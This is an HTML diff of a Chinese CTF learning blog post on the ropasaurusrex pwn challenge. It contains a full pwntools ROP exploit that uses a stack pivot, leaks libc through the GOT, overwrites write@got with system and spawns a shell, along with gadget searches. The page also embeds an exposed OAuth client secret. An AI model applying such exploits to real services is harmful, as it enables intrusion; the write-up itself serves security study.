@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>ropasaurusrex level2 | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="CTF,Pwn">
+    <meta name="description" content="ROP区域较小的情况 改变read的size 256字节 -&gt; 160字节  限制写入size1$ xxd -p ropasaurusrex | sed -e &#39;s&#x2F;c744240800010000&#x2F;c7442408a0000000&#x2F;&#39; | xxd -r -p &gt; ropasaurusrex2  确认123456789$ diff &lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ropasaurusrex level2">
+<meta property="og:url" content="https://darkwing.moe/2019/04/22/ropasaurusrex-level2/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="ROP区域较小的情况 改变read的size 256字节 -&gt; 160字节  限制写入size1$ xxd -p ropasaurusrex | sed -e &#39;s&#x2F;c744240800010000&#x2F;c7442408a0000000&#x2F;&#39; | xxd -r -p &gt; ropasaurusrex2  确认123456789$ diff &lt;">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041902.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019042201.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019042301.jpg">
+<meta property="article:published_time" content="2019-04-22T04:32:29.000Z">
+<meta property="article:modified_time" content="2019-04-23T06:57:04.966Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041902.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ropasaurusrex level2</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">ropasaurusrex level2</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-04-22T04:32:29.000Z" itemprop="datePublished" class="page-time">
+  2019-04-22
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ROP区域较小的情况"><span class="post-toc-number">1.</span> <span class="post-toc-text">ROP区域较小的情况</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#限制写入size"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">限制写入size</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#确认"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">确认</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#只有160字节，无法直接构造ROP"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">只有160字节，无法直接构造ROP</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exploit"><span class="post-toc-number">2.</span> <span class="post-toc-text">exploit</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#使用stack-pivot"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">使用stack pivot</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Hint"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">Hint</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#leave-gadget"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">leave gadget</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exploit-1"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">exploit</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#"><span class="post-toc-number">3.</span> <span class="post-toc-text">???</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-ropasaurusrex-level2"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ropasaurusrex level2</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-04-22 12:32:29" datetime="2019-04-22T04:32:29.000Z"  itemprop="datePublished">2019-04-22</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="ROP区域较小的情况"><a href="#ROP区域较小的情况" class="headerlink" title="ROP区域较小的情况"></a>ROP区域较小的情况</h1><ul>
+<li>改变read的size</li>
+<li>256字节 -&gt; 160字节</li>
+</ul>
+<h2 id="限制写入size"><a href="#限制写入size" class="headerlink" title="限制写入size"></a>限制写入size</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ xxd -p ropasaurusrex | sed -e &#39;s&#x2F;c744240800010000&#x2F;c7442408a0000000&#x2F;&#39; | xxd -r -p &gt; ropasaurusrex2</span><br></pre></td></tr></table></figure>
+
+<h2 id="确认"><a href="#确认" class="headerlink" title="确认"></a>确认</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ diff &lt;(objdump -d -M intel ropasaurusrex) &lt;(objdump -d -M intel ropasaurusrex2)</span><br><span class="line">2c2</span><br><span class="line">&lt; ropasaurusrex：     文件格式 elf32-i386</span><br><span class="line">---</span><br><span class="line">&gt; ropasaurusrex2：     文件格式 elf32-i386</span><br><span class="line">129c129</span><br><span class="line">&lt;  80483fd:	c7 44 24 08 00 01 00 	mov    DWORD PTR [esp+0x8],0x100</span><br><span class="line">---</span><br><span class="line">&gt;  80483fd:	c7 44 24 08 a0 00 00 	mov    DWORD PTR [esp+0x8],0xa0</span><br></pre></td></tr></table></figure>
+
+<h2 id="只有160字节，无法直接构造ROP"><a href="#只有160字节，无法直接构造ROP" class="headerlink" title="只有160字节，无法直接构造ROP"></a>只有160字节，无法直接构造ROP</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019041902.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<ul>
+<li><p>只能够调用一个函数</p>
+</li>
+<li><p>但是可以使用stack pivot</p>
+</li>
+</ul>
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><h2 id="使用stack-pivot"><a href="#使用stack-pivot" class="headerlink" title="使用stack pivot"></a>使用stack pivot</h2><ul>
+<li>这就是类似stager，需要两个阶段的ROP<ul>
+<li>ROP执行stack pivot(stager1)</li>
+<li>通过stack pivot执行正常攻略的ROP(stager2)</li>
+<li>stack pivot之后，与之前的攻略相同</li>
+</ul>
+</li>
+</ul>
+<h2 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h2><ul>
+<li><p>无法构造一个准备ebp的gadget？</p>
+</li>
+<li><p>这个问题中，原本使用了leave ret</p>
+<ul>
+<li>不需要讲pop ebp加载到stack上也可以</li>
+<li>只需要将目标ebp写到old-ebp</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019042201.jpg" alt=""></p>
+</li>
+</ul>
+<h2 id="leave-gadget"><a href="#leave-gadget" class="headerlink" title="leave gadget"></a>leave gadget</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ ropsearch &quot;leave&quot; 0x08048000 0x08049000</span><br><span class="line">Searching for ROP gadget: &#39;leave&#39; in range: 0x8048000 - 0x8049000</span><br><span class="line">0x080482ea : (b&#39;c9c3&#39;)	leave; ret</span><br><span class="line">0x080483f1 : (b&#39;c9c3&#39;)	leave; ret</span><br><span class="line">0x0804841b : (b&#39;c9c3&#39;)	leave; ret</span><br><span class="line">0x08048447 : (b&#39;c9c3&#39;)	leave; ret</span><br><span class="line">0x08048506 : (b&#39;c9c3&#39;)	leave; ret</span><br></pre></td></tr></table></figure>
+
+<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># preparing for exploitation</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; 0x0804830c</span><br><span class="line">read_plt &#x3D; 0x0804832c</span><br><span class="line">pop3ret &#x3D; 0x80484b6</span><br><span class="line">write_got &#x3D; 0x8049614</span><br><span class="line">read_got &#x3D; 0x804961c</span><br><span class="line">data &#x3D; 0x08049620</span><br><span class="line">system_offset &#x3D; 0x0003d200</span><br><span class="line">write_offset &#x3D; 0x000e6d80</span><br><span class="line">bss_addr &#x3D; 0x08049628 + 0x300</span><br><span class="line">bss_top_addr &#x3D; 0x08049000</span><br><span class="line">leave_ret &#x3D; 0x080482ea</span><br><span class="line"></span><br><span class="line">log.info(&#39;Pwning&#39;)</span><br><span class="line"></span><br><span class="line">buf &#x3D; &#39;A&#39; * 136</span><br><span class="line">buf +&#x3D; p32(bss_addr-4)</span><br><span class="line">buf +&#x3D; p32(read_plt)</span><br><span class="line">buf +&#x3D; p32(leave_ret)</span><br><span class="line">buf +&#x3D; p32(0)</span><br><span class="line">buf +&#x3D; p32(bss_addr)</span><br><span class="line">buf +&#x3D; p32(72)</span><br><span class="line"></span><br><span class="line"># write(STDOUT, got_write, 4)</span><br><span class="line">buf2 &#x3D; p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line"># read(STDIN, data, 8)</span><br><span class="line">buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) +p32(data) + p32(8)</span><br><span class="line"># read(STDIN, got_write, 4)</span><br><span class="line">buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) + p32(4)</span><br><span class="line"># write(data) # system(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">buf2 +&#x3D; p32(write_plt) + p32(0x41424344) + p32(data)</span><br><span class="line"></span><br><span class="line">conn.send(buf)</span><br><span class="line">conn.send(buf2)</span><br><span class="line"></span><br><span class="line">ret &#x3D; u32(conn.recv())</span><br><span class="line">print(&#39;write@got: &#123;&#125;&#39;.format(hex(ret)))</span><br><span class="line">print(&#39;libc_start: &#123;&#125;&#39;.format(hex(ret - write_offset)))</span><br><span class="line">system_addr &#x3D; ret - write_offset + system_offset</span><br><span class="line">print(&#39;system: &#123;&#125;&#39;.format(hex(system_addr)))</span><br><span class="line"></span><br><span class="line">conn.send(&#39;&#x2F;bin&#x2F;sh&#39;+&#39;\x00&#39;)</span><br><span class="line"></span><br><span class="line">buf &#x3D; p32(system_addr)</span><br><span class="line"></span><br><span class="line">conn.send(buf)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>return之前4个字节是old-ebp，设置为bss之前4个字节地址。减去4个字节是因为在最终处理时，pop会将old ebp加上4个字节</li>
+<li>bss地址加上0x500原因是，在添加函数时，栈会扩展。如果没有添加，则可能会进入到其他区域，其他区域可能不可读写，导致SIGSEGV</li>
+</ul>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019042301.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id=""><a href="#" class="headerlink" title="???"></a>???</h1><p> 喵了个咪的，最开始用的conn.sendline(),一直EOFError，今天看代码忽然想到是不是这个问题，果然是</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2019-04-23T06:57:04.966Z" itemprop="dateUpdated">2019-04-23 14:57:04</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/&title=《ropasaurusrex level2》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/&title=《ropasaurusrex level2》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ropasaurusrex level2》 — 喵喵喵喵&url=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/04/23/ropasaurusrex-level3/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">ropasaurusrex level3</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/04/19/Plaid-CTF-2013-pwn200-%E2%80%93-ropasaurusrex/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Plaid CTF 2013 - pwn200 – ropasaurusrex</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/&title=《ropasaurusrex level2》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/&title=《ropasaurusrex level2》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ropasaurusrex level2》 — 喵喵喵喵&url=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/04/22/ropasaurusrex-level2/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMklEQVR42u3aQW7DMAwF0d7/0i7QVYE28nxKaWFytAqcxNLzgqZIfXzgcX2NV1eub2N95ee3638dHjJkyHgs41qOVwyyIALgD2j9LxkyZExgrIPsBcYaueat5yUvABkyZMhYp2spkv9ehgwZMnYCLk8TeXL5D+8NGTJkPIpBAh8f/KHUNr0yZMiYxkgbA3/5+Y39DRkyZDyEcSqMkiBYSxbRqmTIkNGaUZuAH7DgIbv27dZzkiFDxkMY6UEHUix7x7GwmysyZMgYwOA3Ir9Py3Y722kZMmRMY+wkZ7VjExyJUkMZMmS0Zuy3GNPyWXrU7OZuMmTIaM3gaV9apueLJhtXtLmVIUPGMEZa8Koh+ewIL0OGjKaMWqBMW5XkbmmJTYYMGdMYPBVLj3DV7hZX0mTIkNGakRboeSJIllJrWL58KDJkyGjKSLeaaWMgLboVD4fJkCFjJONUS4A3NbeaDTJkyBjASNO49BhEbXFBo0KGDBmtGWkRjbcwdxoJ+0fKZMiQ0Ymxk5bVKl28ScALcDJkyJjA4MUvXmjjoTZto/6yHhkyZLRm7LQVgwnCwxl8XhkyZExg1Ar0pFS3n1DG7w0ZMmQ0ZdS2jmkCVwvcZC4ZMmTMYfByGz/IRbbHvC1xoHYoQ4aMFgxedIsPPRwaN49JhgwZMnDwrW1oSRPiJhDLkCFDRpgmnm2IoociQ4aMAYxasT4twwUBNN3cypAhozUj3UCeDcpxCogbDzJkyGjB+AROM56cAxrv6AAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
